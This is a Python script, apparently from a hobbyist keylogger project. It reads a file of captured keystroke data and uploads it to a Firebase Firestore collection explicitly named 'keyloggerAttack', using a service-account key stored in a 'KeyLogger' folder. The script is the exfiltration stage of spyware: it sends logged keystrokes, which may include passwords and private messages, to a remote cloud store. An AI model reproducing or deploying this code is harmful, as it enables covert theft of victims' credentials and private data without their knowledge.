import firebase_admin
from firebase_admin import credentials, firestore

# Initialize Firebase Admin SDK with your service account key JSON
cred = credentials.Certificate("S:\\Programms\\PYTHON\\KeyLogger\\pettify-96749-firebase-adminsdk-a4j7e-7882d61ef2.json")
firebase_admin.initialize_app(cred)

# Firestore client
db = firestore.client()

def upload_file_as_document(file_path, collection_name="keyloggerAttack", document_id="cleanedData"):
    """
    Uploads the entire content of a specified file as a single document in Firebase Firestore.

    Parameters:
        file_path (str): Path to the file containing cleaned data.
        collection_name (str): Firestore collection name.
        document_id (str): ID of the document where data will be uploaded.
    """
    # Read the entire content of the file
    with open(file_path, 'r', encoding='utf-8') as file:
        cleaned_data = file.read()

    # Create a document reference in Firestore with the specified ID
    document_id=input("Enter Document Name :- ")
    doc_ref = db.collection(collection_name).document(document_id)
    
    # Upload the entire content of the file as a single field in the document
    doc_ref.set({"text": cleaned_data})

    print(f"Data from {file_path} uploaded to Firestore collection '{collection_name}' with document ID '{document_id}'.")

# Example usage
upload_file_as_document("S:\\Programms\\PYTHON\\KeyLogger\\extracted_data.txt")
